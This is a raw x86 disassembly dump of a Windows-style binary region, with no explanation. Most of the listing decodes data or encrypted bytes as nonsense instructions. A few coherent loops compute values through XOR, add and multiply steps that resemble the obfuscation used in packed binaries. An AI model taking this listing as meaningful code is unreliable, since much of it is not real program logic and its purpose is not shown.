  40588b:	jno    0x405896
  40588d:	int3   
  40588e:	jbe    0x405866
  405890:	cmp    edx,DWORD PTR [esp+esi*4]
  405893:	lahf   
  405894:	fnstsw WORD PTR [edi]
  405896:	inc    ebx
  405897:	test   eax,0xcd21adcf
  40589c:	outs   dx,DWORD PTR ds:[esi]
  40589d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40589e:	nop
  40589f:	adc    eax,0x6c7cd910
  4058a4:	pop    eax
  4058a5:	jmp    0x2cfab502
  4058aa:	dec    edi
  4058ab:	sub    eax,0x6f31f42
  4058b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058b1:	mov    al,0xb6
  4058b3:	ja     0x405854
  4058b5:	mov    bh,0xcb
  4058b7:	or     ecx,DWORD PTR ds:0x436e1b4a
  4058bd:	ret    
  4058be:	fwait
  4058bf:	mov    dl,0x47
  4058c1:	mov    BYTE PTR [eax],ch
  4058c3:	jb     0x4058c3
  4058c5:	je     0x4058f8
  4058c7:	inc    ebx
  4058c8:	mov    edi,0x8e9e5485
  4058cd:	sbb    eax,0xb17c483a
  4058d2:	add    DWORD PTR [ebx+edi*4+0x2c],ecx
  4058d6:	dec    ebx
  4058d7:	sbb    al,0x57
  4058d9:	adc    dl,al
  4058db:	mov    edi,0xd7d48265
  4058e0:	and    edi,DWORD PTR [esi]
  4058e2:	cdq    
  4058e3:	push   esp
  4058e4:	pcmpeqw mm4,QWORD PTR [ebp-0x1caebe01]
  4058eb:	mov    DWORD PTR [edi+0x75],esp
  4058ee:	loopne 0x4058fa
  4058f0:	or     eax,0xf19b304f
  4058f5:	xchg   esi,eax
  4058f6:	jns    0x40590f
  4058f8:	ds aaa 
  4058fa:	in     al,dx
  4058fb:	push   0x62
  4058fd:	push   esp
  4058fe:	adc    dl,BYTE PTR [ecx]
  405900:	push   ebx
  405901:	jne    0x405889
  405903:	loope  0x4058e0
  405905:	ins    DWORD PTR es:[edi],dx
  405906:	aad    0xf7
  405908:	fs out dx,al
  40590a:	add    eax,0xbe31c9
  40590f:	iret   
  405910:	and    bl,bl
  405912:	shl    esi,1
  405914:	jbe    0x40591b
  405916:	jmp    0x4058ad
  405918:	add    bl,BYTE PTR [edi+eax*8-0x1f]
  40591c:	mov    al,0x54
  40591e:	push   ebx
  40591f:	mov    cs,WORD PTR [ebx-0x45]
  405922:	mov    esi,DWORD PTR [ebx-0x7779c5f3]
  405928:	ret    
  405929:	fist   WORD PTR [edi+0x7ec0a680]
  40592f:	push   ebp
  405930:	int3   
  405931:	push   eax
  405932:	jo     0x4058e0
  405934:	icebp  
  405935:	pop    edi
  405936:	inc    esi
  405937:	cmp    eax,0xb735e096
  40593c:	xor    ebp,DWORD PTR [esi]
  40593e:	fnsave [edi+edx*2]
  405941:	push   ds
  405942:	push   esi
  405943:	inc    edx
  405944:	add    BYTE PTR [ebp-0x36],ah
  405947:	cwde   
  405948:	push   0xd4f38d50
  40594d:	mov    esi,0x8d59341d
  405952:	push   ss
  405953:	mov    ah,0x46
  405955:	sbb    esi,ebx
  405957:	sub    DWORD PTR [esi],esi
  405959:	leave  
  40595a:	push   ss
  40595b:	out    0xb1,al
  40595d:	es es mov esi,0xffd9ecd6
  405964:	nop
  405965:	or     bh,al
  405967:	inc    ebx
  405968:	fnstcw WORD PTR [esi]
  40596a:	xor    al,0x1d
  40596c:	(bad)  
  40596d:	xchg   edi,eax
  40596e:	xchg   esp,eax
  40596f:	push   es
  405970:	lds    edx,FWORD PTR [ecx]
  405972:	xchg   edx,eax
  405973:	ins    DWORD PTR es:[edi],dx
  405974:	mov    dl,ah
  405976:	hlt    
  405977:	scas   al,BYTE PTR es:[edi]
  405978:	pop    eax
  405979:	aaa    
  40597a:	ror    BYTE PTR [ebp-0x10],0x4c
  40597e:	retf   0xfa22
  405981:	pop    eax
  405982:	cld    
  405983:	and    DWORD PTR [edi+ebp*2-0x18],ebp
  405987:	mov    cl,ah
  405989:	push   edx
  40598a:	inc    esi
  40598b:	sub    BYTE PTR [ecx],cl
  40598d:	loop   0x405951
  40598f:	push   ebp
  405990:	push   esi
  405991:	push   cs
  405992:	mov    bh,0x4b
  405994:	pop    ss
  405995:	push   ds
  405996:	stc    
  405997:	xchg   ebp,eax
  405998:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405999:	and    BYTE PTR [ebp-0x679fd8f5],0xc5
  4059a0:	push   ecx
  4059a1:	lods   al,BYTE PTR ds:[esi]
  4059a2:	(bad)  
  4059a3:	(bad)  
  4059a4:	sub    eax,0xce449aee
  4059a9:	add    esp,DWORD PTR [eax+eiz*2-0x6827b4b3]
  4059b0:	sub    eax,0xdae6a907
  4059b5:	mov    edx,0xe2ec96f8
  4059ba:	add    eax,ebp
  4059bc:	int3   
  4059bd:	mov    ebx,DWORD PTR [ebx-0x5e]
  4059c0:	adc    edi,DWORD PTR [ecx+0x35]
  4059c3:	call   0x1dbe0542
  4059c8:	push   ss
  4059c9:	adc    ebx,edi
  4059cb:	das    
  4059cc:	jae    0x4059a2
  4059ce:	add    al,0x79
  4059d0:	sti    
  4059d1:	mov    bh,0x83
  4059d3:	idiv   BYTE PTR [edi+ecx*2+0x53]
  4059d7:	mov    bh,0xdf
  4059d9:	fcmovnb st,st(2)
  4059db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059dc:	bound  esi,QWORD PTR ds:0x61ccaf51
  4059e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059e3:	jns    0x4059ec
  4059e5:	mov    edi,0x6498bc9a
  4059ea:	scas   al,BYTE PTR es:[edi]
  4059eb:	or     eax,0xffffffb6
  4059ee:	cmp    DWORD PTR [edx],edx
  4059f0:	cmp    BYTE PTR [esi+0x768344b0],ah
  4059f6:	and    eax,0x1e91bb4e
  4059fb:	(bad)  
  4059fd:	in     eax,0xe9
  4059ff:	jp     0x405a66
  405a01:	xchg   DWORD PTR [eax],ebx
  405a03:	mov    bl,0x8f
  405a05:	fiadd  WORD PTR [ebp+edi*8+0x398da299]
  405a0c:	retf   
  405a0d:	jne    0x405a63
  405a0f:	inc    ebx
  405a10:	push   eax
  405a11:	mov    ecx,0x4e06ef09
  405a16:	and    esp,DWORD PTR [eax]
  405a18:	mov    ds:0xb547587e,al
  405a1d:	dec    ebx
  405a1e:	gs jle 0x405a9d
  405a21:	ja     0x4059f7
  405a23:	mov    ds,WORD PTR [ebp+0xc]
  405a26:	dec    edi
  405a27:	add    edi,DWORD PTR [ecx+0x51]
  405a2a:	fld    DWORD PTR [edi-0x12]
  405a2d:	inc    edx
  405a2e:	call   0xca03f764
  405a33:	xchg   bh,dl
  405a35:	push   ss
  405a36:	imul   edx,DWORD PTR [eax],0xefddf3f1
  405a3c:	xchg   DWORD PTR [ebp-0x1],ebp
  405a3f:	jo     0x405a61
  405a41:	lea    ebx,ds:0x18801cde
  405a47:	adc    eax,0x6325649d
  405a4c:	and    eax,0xc71ea401
  405a51:	inc    ebp
  405a52:	clc    
  405a53:	xor    DWORD PTR [ebp-0x1d7e0764],eax
  405a59:	jnp    0x405ad4
  405a5b:	add    BYTE PTR [eax],al
  405a5d:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  405a64:	and    edx,edx
  405a66:	mov    eax,DWORD PTR [ebp-0x4]
  405a69:	sbb    ecx,DWORD PTR ds:0x42fd05
  405a6f:	push   esi
  405a70:	mov    esi,DWORD PTR [ebp-0x8]
  405a73:	and    DWORD PTR ds:0x42fcf1,0x0
  405a7d:	jmp    0x405a8f
  405a82:	mov    edx,DWORD PTR ds:0x42fcf1
  405a88:	inc    edx
  405a89:	mov    DWORD PTR ds:0x42fcf1,edx
  405a8f:	cmp    DWORD PTR ds:0x42fcf1,0x17
  405a96:	jae    0x405b0b
  405a9c:	cmp    DWORD PTR ds:0x42fcf1,0x1d
  405aa3:	jne    0x405ab5
  405aa9:	push   DWORD PTR [ebp-0x24]
  405aac:	push   DWORD PTR [ebp-0x20]
  405aaf:	call   DWORD PTR ds:0x42e2db
  405ab5:	jmp    0x405a82
  405aba:	mov    DWORD PTR ds:0x42fcd9,0x14
  405ac4:	cmp    DWORD PTR ds:0x42fcd9,0x0
  405acb:	je     0x405b0b
  405ad1:	cmp    DWORD PTR ds:0x42fcd9,0x16
  405ad8:	jne    0x405af7
  405ade:	push   DWORD PTR [ebp-0x14]
  405ae1:	push   0x2e3f
  405ae6:	push   DWORD PTR [ebp-0x18]
  405ae9:	push   DWORD PTR [ebp-0x18]
  405aec:	push   0x8cdb
  405af1:	call   DWORD PTR ds:0x42e537
  405af7:	xor    edx,edx
  405af9:	xor    edx,DWORD PTR ds:0x42fcd9
  405aff:	dec    edx
  405b00:	mov    DWORD PTR ds:0x42fcd9,edx
  405b06:	jmp    0x405ac4
  405b0b:	mov    edx,0x7510855
  405b10:	add    DWORD PTR ds:0x42fcd1,edi
  405b16:	xor    eax,edx
  405b18:	and    DWORD PTR ds:0x42e6f7,ebx
  405b1e:	xor    esi,edx
  405b20:	mov    ecx,0x32729c
  405b25:	add    esi,ecx
  405b27:	add    eax,ecx
  405b29:	imul   eax,esi
  405b2c:	mov    esi,DWORD PTR [ebp+0xc]
  405b2f:	cmp    esi,eax
  405b31:	jne    0x405b4d
  405b37:	mov    eax,DWORD PTR [ebp-0x4]
  405b3a:	mov    esi,DWORD PTR [ebp-0x8]
  405b3d:	xor    eax,edx
  405b3f:	xor    esi,edx
  405b41:	add    eax,ecx
  405b43:	add    esi,ecx
  405b45:	imul   eax,esi
  405b48:	jmp    0x405e5b
  405b4d:	mov    eax,DWORD PTR [ebp+0xc]
  405b50:	mov    eax,DWORD PTR [eax+0x78]
  405b53:	mov    DWORD PTR [ebp+0xc],eax
  405b56:	mov    eax,DWORD PTR [ebp-0x4]
  405b59:	mov    esi,DWORD PTR [ebp-0x8]
  405b5c:	xor    eax,edx
  405b5e:	xor    esi,edx
  405b60:	add    eax,ecx
  405b62:	add    esi,ecx
  405b64:	imul   eax,esi
  405b67:	mov    esi,DWORD PTR [ebp+0xc]
  405b6a:	cmp    esi,eax
  405b6c:	mov    eax,DWORD PTR [ebp-0x4]
  405b6f:	je     0x405b3a
  405b75:	jmp    0x405e48
  405b7a:	xchg   DWORD PTR [ebx-0xdac0d75],edi
  405b80:	imul   esi,DWORD PTR gs:[eax+0x3],0x1b22624d
  405b88:	fild   QWORD PTR [edi-0x7c]
  405b8b:	xor    dh,BYTE PTR [eax+0x70]
  405b8e:	stos   BYTE PTR es:[edi],al
  405b8f:	jle    0x405c01
  405b91:	jo     0x405b58
  405b93:	imul   eax,DWORD PTR [esi],0xffffffaf
  405b96:	mov    eax,0xcb75996a
  405b9b:	sub    BYTE PTR [eax-0x2dfa7da3],0x79
  405ba2:	inc    ebp
  405ba3:	mov    bh,bl
  405ba5:	mov    DWORD PTR [edx],ebp
  405ba7:	add    ebx,DWORD PTR [esi+0x59]
  405baa:	stc    
  405bab:	in     eax,0x86
  405bad:	jle    0x405c02
  405baf:	rcr    DWORD PTR [edx+edx*1-0x544a7582],1
  405bb6:	push   edx
  405bb7:	in     al,dx
  405bb8:	mov    ebp,0x8fe028d5
  405bbd:	inc    ebp
  405bbe:	cli    
  405bbf:	cmp    al,0xd0
  405bc1:	add    DWORD PTR [esi+0x6acf8190],ecx
  405bc7:	imul   DWORD PTR [eax-0x6b]
  405bca:	mov    ch,0xd7
  405bcc:	add    BYTE PTR [esi+ebp*8],cl
  405bcf:	test   BYTE PTR [ecx+0x43],0x27
  405bd3:	scas   al,BYTE PTR es:[edi]
  405bd4:	push   esp
  405bd5:	adc    bl,BYTE PTR [ecx+0x36]
  405bd8:	pop    eax
  405bd9:	shl    DWORD PTR [ecx+edi*2],cl
  405bdc:	and    ch,BYTE PTR [edx+0x6e]
  405bdf:	fcom   DWORD PTR [esi-0x25]
  405be2:	imul   BYTE PTR [edi]
  405be4:	sbb    al,dh
  405be6:	push   edi
  405be7:	in     al,0xe4
  405be9:	aad    0xd9
  405beb:	push   esp
  405bec:	out    dx,eax
  405bed:	pusha  
  405bee:	mov    dl,0x21
  405bf0:	xchg   BYTE PTR [edi],dl
  405bf2:	(bad)  
  405bf3:	adc    eax,0x55a2d70c
  405bf8:	mov    cl,0x66
  405bfa:	push   0xffffffc1
  405bfc:	jmp    0xe768:0xf3b84644
  405c03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c04:	pop    eax
  405c05:	mov    ah,0x89
  405c07:	mov    ch,dl
  405c09:	mov    ah,0xeb
  405c0b:	push   ebp
  405c0c:	neg    BYTE PTR [eax-0x6]
  405c0f:	lods   al,BYTE PTR ds:[esi]
  405c10:	cwde   
  405c11:	xor    DWORD PTR [edx+0x4e124c1],esi
  405c17:	xchg   ebp,eax
  405c18:	(bad)  
  405c19:	hlt    
  405c1a:	add    al,0x7c
  405c1c:	mov    ecx,0xce1fd6df
  405c21:	xchg   ebp,eax
  405c22:	pop    esi
  405c23:	pop    esi
  405c24:	ret    0xf085
  405c27:	pop    edi
  405c28:	ret    
  405c29:	sub    al,BYTE PTR [eax+0x9f4696b]
  405c2f:	mov    bl,0x2c
  405c31:	xchg   ecx,eax
  405c32:	or     eax,DWORD PTR [eax]
  405c34:	lahf   
  405c35:	dec    eax
  405c36:	aam    0xf2
  405c38:	int    0x8
  405c3a:	mov    eax,0xe3828718
  405c3f:	outs   dx,BYTE PTR ds:[esi]
  405c40:	jae    0x405cbc
  405c42:	add    DWORD PTR [ebx+0x42],ebp
  405c45:	fsubr  QWORD PTR [ebx+0x65e346c6]
  405c4b:	rcr    bl,0x9e
  405c4e:	in     eax,0x87
  405c50:	mov    BYTE PTR [ebx-0x32fb4d15],dh
  405c56:	mov    DWORD PTR [edx-0x32],esp
  405c59:	adc    al,0xb7
  405c5b:	fstp   DWORD PTR [eax-0x5e]
  405c5e:	sub    bh,bh
  405c60:	clc    
  405c61:	mov    edx,0xf37a2024
  405c66:	jbe    0x405bf2
  405c68:	pop    esi
  405c69:	sub    cl,BYTE PTR [ebx+0xde24f25]
  405c6f:	adc    eax,0x8a478db1
  405c74:	mov    edx,0x94c55ce4
  405c79:	jp     0x405c0b
  405c7b:	je     0x405c21
  405c7d:	test   BYTE PTR [edx+0x5bbd923],ch
  405c83:	pop    ebp
  405c84:	jmp    0xdc23:0xbde1e744
  405c8b:	rol    DWORD PTR [esi-0x635376e],cl
  405c91:	jl     0x405cc9
  405c93:	push   0x62
  405c95:	add    DWORD PTR [esp+ebx*2-0x3a],esp
  405c99:	pop    ds
  405c9a:	xchg   edx,eax
  405c9b:	sbb    ebp,DWORD PTR ds:0x38881182
  405ca1:	fistp  WORD PTR [eax*4+0x7aad04ac]
  405ca8:	mov    al,BYTE PTR [ecx+0x6029ce64]
  405cae:	sub    al,ch
  405cb0:	fldenv [eax+0x4d]
  405cb3:	fmulp  st(2),st
  405cb5:	dec    edi
  405cb6:	imul   esi,DWORD PTR [esi+0x31d81272],0xfd4f2815
  405cc0:	mov    bh,0xe9
  405cc2:	add    ch,al
  405cc4:	scas   al,BYTE PTR es:[edi]
  405cc5:	jb     0x405c51
  405cc7:	adc    al,0x95
  405cc9:	cmc    
  405cca:	repnz pop es
  405ccc:	pop    ebx
  405ccd:	neg    dl
  405ccf:	pop    ds
  405cd0:	cmp    esp,DWORD PTR [esi]
  405cd2:	pop    edx
  405cd3:	stos   BYTE PTR es:[edi],al
  405cd4:	dec    edx
  405cd5:	adc    al,BYTE PTR [ebx+0x5a]
  405cd8:	jecxz  0x405cb2
  405cda:	lock rol BYTE PTR [ebp-0x26b8ba1a],1
  405ce1:	out    0xb1,al
  405ce3:	xchg   DWORD PTR [eax],ebp
  405ce5:	ins    DWORD PTR es:[edi],dx
  405ce6:	push   0xb80cd531
  405ceb:	sub    bh,cl
  405ced:	mov    ebx,0xa2283e0f
  405cf2:	gs dec edi
  405cf4:	mov    edi,0xcb63483e
  405cf9:	sbb    ecx,esi
  405cfb:	push   edi
  405cfc:	sbb    BYTE PTR ds:0x366580dc,0xad
  405d03:	sbb    ebx,eax
  405d05:	xor    al,0xda
  405d07:	mov    al,ds:0x5974262a
  405d0c:	lock ss push eax
  405d0f:	sbb    eax,0x46571ecb
  405d14:	stos   DWORD PTR es:[edi],eax
  405d15:	pop    ds
  405d16:	sbb    al,0x47
  405d18:	cmp    esp,DWORD PTR [esi-0x8]
  405d1b:	pusha  
  405d1c:	cmp    BYTE PTR [edx],0x46
  405d1f:	push   ss
  405d20:	loop   0x405d9c
  405d22:	cmp    bl,ch
  405d24:	adc    ebx,DWORD PTR [ebx+ecx*2+0xe218dad]
  405d2b:	out    dx,eax
  405d2c:	inc    ebx
  405d2d:	jno    0x405cbd
  405d2f:	and    BYTE PTR [ebp+ebx*2-0x3e3394f0],bl
  405d36:	mov    edi,es
  405d38:	aas    
  405d39:	adc    DWORD PTR [edi-0x49],ecx
  405d3c:	lods   al,BYTE PTR ds:[esi]
  405d3d:	imul   esi,ecx,0xde46f10c
  405d43:	push   es
  405d44:	dec    esi
  405d45:	aaa    
  405d46:	adc    bh,BYTE PTR [esi+eiz*2]
  405d49:	jo     0x405cde
  405d4b:	sbb    al,0xc3
  405d4d:	mov    eax,ds:0x270e446d
  405d52:	inc    BYTE PTR [ecx-0x3135f72d]
  405d58:	push   es
  405d59:	rcr    BYTE PTR [edx+0xb],1
  405d5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d5d:	cmp    eax,0x9a521fd3
  405d62:	into   
  405d63:	push   ebx
  405d64:	push   esi
  405d65:	inc    ebp
  405d66:	jp     0x405d60
  405d68:	mov    eax,ds:0x89833e51
  405d6d:	mov    DWORD PTR [ecx-0x31],edi
  405d70:	test   BYTE PTR [ebx],ah
  405d72:	and    esi,DWORD PTR [eax]
  405d74:	jo     0x405d45
  405d76:	dec    eax
  405d77:	leave  
  405d78:	(bad)  [bp+di-0x45]
  405d7c:	sahf   
  405d7d:	(bad)  
  405d7e:	(bad)  
  405d7f:	ret    
  405d80:	sub    BYTE PTR [ebx-0x5a],0x6c
  405d84:	mov    al,0x33
  405d86:	adc    eax,0xccefff30
  405d8b:	retf   
  405d8c:	xor    esi,DWORD PTR [edx+0x1c]
  405d8f:	scas   eax,DWORD PTR es:[edi]
  405d90:	mov    esi,ss
  405d92:	out    0xee,eax
  405d94:	repnz addr16 aas 
  405d97:	(bad)  
  405d98:	cld    
  405d99:	jne    0x405d95
  405d9b:	jne    0x405d32
  405d9d:	in     al,0xe0
  405d9f:	repz aad 0x14
  405da2:	repz and al,0xa2
  405da5:	mov    esp,0x6a1cb79a
  405daa:	or     ah,dh
  405dac:	hlt    
  405dad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405dae:	adc    DWORD PTR [ebp-0x68b27cd4],eax
  405db4:	xchg   edx,eax
  405db5:	add    al,0x94
  405db7:	cwde   
  405db8:	lods   eax,DWORD PTR ds:[esi]
  405db9:	xchg   ecx,eax
  405dba:	jnp    0x405df5
  405dbc:	ins    DWORD PTR es:[edi],dx
  405dbd:	iret   
  405dbe:	aad    0x3e
  405dc0:	ror    BYTE PTR [edx-0x5eb4c9b4],cl
  405dc6:	fisttp WORD PTR [esi]
  405dc8:	aas    
  405dc9:	mov    al,0x73
  405dcb:	or     al,BYTE PTR [ebp-0x1c]
  405dce:	mov    ds:0x26150ab,eax
  405dd3:	or     BYTE PTR [ebx],bh
  405dd5:	hlt    
  405dd6:	dec    eax
  405dd7:	or     BYTE PTR [esp-0x55],0x7e
  405ddc:	adc    ch,BYTE PTR [bx+di+0xb]
  405de0:	pushf  
  405de1:	jmp    0x405d65
  405de3:	in     al,dx
  405de4:	outs   dx,DWORD PTR ds:[esi]
  405de5:	cmp    ebx,DWORD PTR ds:0x7a1883a6
  405deb:	pop    es
  405dec:	cmp    ebx,DWORD PTR [ebp+esi*1+0xc20fa1c]
  405df3:	adc    ebp,DWORD PTR [edx+0x69abba36]
  405df9:	in     al,dx
  405dfa:	sub    esp,ecx
  405dfc:	or     bh,BYTE PTR [ebx-0x72]
  405dff:	into   
  405e00:	in     al,0x14
  405e02:	push   ebp
  405e03:	sub    ebx,ecx
  405e05:	jle    0x405d90
  405e07:	das    
  405e08:	iret   
  405e09:	not    DWORD PTR [ecx*1+0x25226975]
  405e10:	xor    ebp,DWORD PTR [edx]
  405e12:	mov    ds:0xe60ba342,al
  405e17:	push   esi
  405e18:	sub    ebx,DWORD PTR ds:0xd909d8de
  405e1e:	call   0x5d9b:0xa852fff1
  405e25:	jle    0x405e6a
  405e27:	das    
  405e28:	cmp    eax,0x7b30fe88
  405e2d:	jge    0x405dbf
  405e2f:	lahf   
  405e30:	add    al,cl
  405e32:	(bad)  
  405e33:	cmp    eax,esi
  405e35:	stos   DWORD PTR es:[edi],eax
  405e36:	sbb    eax,DWORD PTR [ebx-0x33]
  405e39:	mov    esp,0x9f607561
  405e3e:	out    dx,eax
  405e3f:	jo     0x405df4
  405e41:	fcmovnu st,st(5)
  405e43:	idiv   BYTE PTR ds:0x3316ab91
  405e49:	ret    0xc103
  405e4c:	mov    ecx,DWORD PTR [ebp+0xc]
  405e4f:	imul   eax,ecx
  405e52:	add    eax,DWORD PTR [ebp+0x8]
  405e55:	mov    DWORD PTR [ebp+0xc],eax
  405e58:	mov    eax,DWORD PTR [ebp+0xc]
  405e5b:	pop    esi
  405e5c:	leave  
  405e5d:	ret    0x8
  405e60:	push   ebp
  405e61:	mov    ebp,esp
  405e63:	push   ecx
  405e64:	add    DWORD PTR ds:0x42e70f,0x1508
  405e6e:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  405e75:	mov    eax,DWORD PTR [ebp-0x4]
  405e78:	mov    edx,DWORD PTR [ebp+0x10]
  405e7b:	adc    DWORD PTR ds:0x42e6ef,0x4006
  405e85:	mov    ecx,0x7510855
  405e8a:	xor    DWORD PTR ds:0x42fd01,0x260
  405e94:	xor    eax,ecx
  405e96:	jmp    0x40605c
  405e9b:	fidiv  DWORD PTR [edx+0x7b]
  405e9e:	jle    0x405e33
  405ea0:	jne    0x405e7b
  405ea2:	jb     0x405e2d
  405ea4:	(bad)  
  405ea5:	(bad)  
  405ea6:	sub    al,0x4c
  405ea8:	adc    al,BYTE PTR [edx+0x703f3e74]
  405eae:	jo     0x405e57
  405eb0:	jg     0x405f22
  405eb2:	jo     0x405eac
  405eb4:	push   0xfffffffe
  405eb6:	ret    
  405eb7:	dec    ebp
  405eb8:	push   edi
  405eb9:	pushf  
  405eba:	sub    ebx,DWORD PTR [edi+0x21]
  405ebd:	sub    eax,0xa878846f
  405ec2:	test   al,0xf6
  405ec4:	aaa    
  405ec5:	adc    eax,0xacb6c456
  405eca:	fidiv  WORD PTR [esi+0x66]
  405ecd:	imul   edi,DWORD PTR [edx-0x47],0x66
  405ed1:	mov    dl,0x86
  405ed3:	mov    eax,0xc09e1f2e
  405ed8:	dec    esi
  405ed9:	mov    eax,ds:0x558d2a34
  405ede:	and    eax,0x1ac6a755
  405ee3:	ins    BYTE PTR es:[edi],dx
  405ee4:	adc    al,0x98
  405ee6:	and    eax,DWORD PTR [edx+0x55]
  405ee9:	retf   0x1a29
  405eec:	inc    edi
  405eed:	call   0x814f1610
  405ef2:	stc    
  405ef3:	jg     0x405ec4
  405ef5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ef6:	xor    eax,0xb6109c0c
  405efb:	mov    WORD PTR ds:0x7bf50cc0,cs
  405f01:	in     al,0xcd
  405f03:	add    edx,DWORD PTR [ebx-0x6d6a129a]
  405f09:	jb     0x405eb9
  405f0b:	mov    bl,0x3b
  405f0d:	push   ecx
  405f0e:	adc    al,0x79
  405f10:	les    ecx,FWORD PTR [edi-0x57]
  405f13:	cmp    al,0x62
  405f15:	cmp    esi,0xf0543498
  405f1b:	fdivp  st(3),st
  405f1e:	xchg   edi,eax
  405f1f:	and    cl,BYTE PTR [ebx]
  405f21:	xor    DWORD PTR [ebx],esi
  405f23:	mov    edx,0x486ef6b5
  405f28:	push   cs
  405f29:	push   edx
  405f2a:	je     0x405f39
  405f2c:	lds    ebx,FWORD PTR [esi+0x46899cbe]
  405f32:	leave  
  405f33:	xchg   esi,eax
  405f34:	mov    edx,0x67887add
  405f39:	dec    ebx
  405f3a:	out    0xd2,al
  405f3c:	shr    BYTE PTR [ebp+0x6276ab93],1
  405f42:	mov    BYTE PTR [edx-0x77],0xf7
  405f46:	mov    bl,0x7e
  405f48:	ins    DWORD PTR es:[edi],dx
  405f49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f4a:	icebp  
  405f4b:	fdivr  DWORD PTR [edi+0x71b9db09]
  405f51:	in     eax,dx
  405f52:	mov    bh,0xf5
  405f54:	mov    DWORD PTR [edi+0x59479cb3],esp
  405f5a:	shr    DWORD PTR [edi+0x717412ce],0x3d
  405f61:	(bad)  
  405f62:	sub    ecx,DWORD PTR [ecx+ebx*1]
  405f65:	retf   0xf9ac
  405f68:	mov    eax,0x6ee6aa0b
  405f6d:	sub    BYTE PTR [ebx+0x1d],dh
  405f70:	xor    eax,0x7385db9f
  405f75:	out    0x2a,eax
  405f77:	fimul  DWORD PTR [edx+0x4568bec0]
  405f7d:	xor    al,0x2f
  405f7f:	outs   dx,BYTE PTR ds:[esi]
  405f80:	nop
  405f81:	dec    ebx
  405f82:	ret    
  405f83:	add    eax,0xbede9aa3
  405f88:	je     0x405fa7
  405f8a:	addr16 ret 0x118e
  405f8e:	or     DWORD PTR [ebp-0x2d],esp
  405f91:	das    
  405f92:	mul    BYTE PTR [ebp+esi*2+0x49]
  405f96:	sub    al,0x7a
  405f98:	inc    esi
  405f99:	je     0x405f89
  405f9b:	js     0x405f74
  405f9d:	mov    bl,0x6f
  405f9f:	ss (bad) 
  405fa1:	call   0x9b05ed4a
  405fa6:	imul   ebx,DWORD PTR [edi+0x3c979324],0x17
  405fad:	inc    esp
  405fae:	cmp    al,al
  405fb0:	jmp    0xd659:0x6f11a21e
  405fb7:	mov    ds:0xd70fb87e,al
  405fbc:	out    0x75,eax
  405fbe:	inc    esi
  405fbf:	rol    DWORD PTR [ebx+edi*8-0x7eb0ae3a],cl
  405fc6:	imul   edx,DWORD PTR [edi+0x34],0x561202ff
  405fcd:	fs pusha 
  405fcf:	into   
  405fd0:	dec    edx
  405fd1:	(bad)  
  405fd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405fd3:	adc    DWORD PTR [ebx-0x71],ecx
  405fd6:	xor    bh,bh
  405fd8:	mov    al,ds:0x9a62ae3d
  405fdd:	in     eax,dx
  405fde:	mov    dh,0x1
  405fe0:	mov    edi,0x3715c933
  405fe5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405fe6:	mov    ?,WORD PTR [eax-0x43]
  405fe9:	ds or  eax,0x45101ba6
  405fef:	jo     0x406053
  405ff1:	add    DWORD PTR [ebx-0xc],esp
  405ff4:	xchg   ebp,eax
  405ff5:	dec    ecx
  405ff6:	(bad)  
  405ff7:	jecxz  0x405fde
  405ff9:	cmp    DWORD PTR [edx+0x35],esi
  405ffc:	mov    ds:0x75146f5,eax
  406001:	std    
  406002:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406003:	fcomi  st,st(7)
  406005:	sub    ah,BYTE PTR ss:[ebp+0x22fcba99]
  40600c:	push   esi
  40600d:	repz or bh,BYTE PTR [edi+eax*2+0x53d1b497]
  406015:	pop    ebx
  406016:	sbb    al,BYTE PTR [edx+0x2a1a3d01]
  40601c:	pop    ebp
  40601d:	adc    edx,eax
  40601f:	sti    
  406020:	mov    dh,BYTE PTR [edx-0x35]
  406023:	ret    
  406024:	scas   eax,DWORD PTR es:[edi]
  406025:	cmp    BYTE PTR [eax],cl
  406027:	imul   esp,ebp,0x77
  40602a:	push   0x239779e0
  40602f:	pushf  
  406030:	test   al,0x32
  406032:	mov    eax,0x55983295
  406037:	dec    esi
  406038:	arpl   WORD PTR [ecx+0x52b8b38a],si
  40603e:	imul   esi,DWORD PTR [esi],0xffffffc9
  406041:	in     al,0x99
  406043:	fdivr  DWORD PTR [esi]
  406045:	pop    ss
  406046:	and    BYTE PTR [edx+0x54707b1e],bh
  40604c:	xor    ecx,DWORD PTR ds:0x3d92b987
  406052:	(bad)  
  406053:	imul   ebx,DWORD PTR [esi],0xf8fb8abb
  406059:	mov    cl,0x36
  40605b:	rol    DWORD PTR ds:0x32729c,0x81
  406062:	or     eax,0x42fd86
  406067:	in     al,0xa
  406069:	add    BYTE PTR [eax],al
  40606b:	mov    DWORD PTR [edx],eax
  40606d:	mov    eax,DWORD PTR [ebp+0xc]
  406070:	xor    eax,ecx
  406072:	push   esi
  406073:	sbb    edx,DWORD PTR ds:0x42e118
  406079:	mov    esi,DWORD PTR [ebp+0x10]
  40607c:	or     DWORD PTR ds:0x42fd76,edx
  406082:	mov    edx,0x32729c
  406087:	sbb    DWORD PTR ds:0x42fcf1,0x42e11c
  406091:	add    eax,edx
  406093:	adc    DWORD PTR ds:0x42fcd1,0x42e6fb
  40609d:	mov    DWORD PTR [esi+0x4],eax
  4060a0:	sbb    eax,0x6979
  4060a5:	mov    eax,DWORD PTR [ebp+0x14]
  4060a8:	adc    DWORD PTR ds:0x42fd82,0x2335
  4060b2:	mov    esi,DWORD PTR [ebp+0x10]
  4060b5:	sub    DWORD PTR ds:0x42fcd5,0x1c02
  4060bf:	mov    DWORD PTR [esi+0x8],eax
  4060c2:	or     eax,DWORD PTR ds:0x42fd05
  4060c8:	jmp    0x40628e
  4060cd:	out    dx,al
  4060ce:	hlt    
  4060cf:	arpl   WORD PTR [edx],dx
  4060d1:	popa   
  4060d2:	xchg   ecx,eax
